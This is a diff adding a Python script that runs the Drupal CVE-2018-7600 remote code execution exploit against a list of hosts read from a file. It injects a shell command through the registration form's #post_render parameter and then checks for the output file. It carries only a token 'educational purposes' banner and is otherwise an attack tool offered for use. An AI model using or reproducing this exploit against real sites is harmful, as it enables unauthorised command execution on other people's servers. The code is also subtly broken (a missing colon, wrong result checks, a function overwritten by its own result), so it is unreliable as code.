@@ -1,0 +1,57 @@
+#!/usr/bin/env python3
+from requests import post, get
+from readline import parse_and_bind
+from requests.exceptions import ConnectionError
+
+info = '\033[1;33m[!]\033[1;m '
+que = '\033[1;34m[?]\033[1;m '
+bad = '\033[1;31m[-]\033[1;m '
+good = '\033[1;32m[+]\033[1;m '
+run = '\033[1;97m[~]\033[1;m '
+
+bash_command = "echo UID: $(id -u) Name: $(id -u -n) | tee user.txt"
+
+
+def cve_2018_7600(target):
+    if not target.startswith('http')
+        print(bad + 'Target URL must contain http or https')
+
+    if not target.endswith('/'):
+        target = target + '/'
+
+    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
+    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1',
+               'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': bash_command}
+
+    r = post(url, data=payload)
+    if r.status_code != 200:
+        print(bad + target + ' Not exploitable')
+    else:
+        user_txt = target + 'user.txt'
+        print(good + 'Checking... ' + user_txt)
+        r_user = get(target)
+        if r_user.status_code != 200:
+            print(good + r_user.text)
+
+
+def exploit_from_file(file_name):
+    with open(file_name) as file:
+        for target in file:
+            try:
+                cve_2018_7600(target.strip())
+            except Exception as e:
+                print(bad + str(e))
+
+
+if __name__ == '__main__':
+    try:
+        print(info + 'Provided only for educational or information purposes.'.upper())
+        parse_and_bind('tab: complete')
+        file_name = input(
+            que + 'Enter file name (example: /root/file/hosts.txt): ')
+        exploit_from_file = exploit_from_file(file_name)
+    except KeyboardInterrupt:
+        print(bad + 'Exiting...')
+        exit(0)
+    except Exception as e:
+        print(bad + str(e))
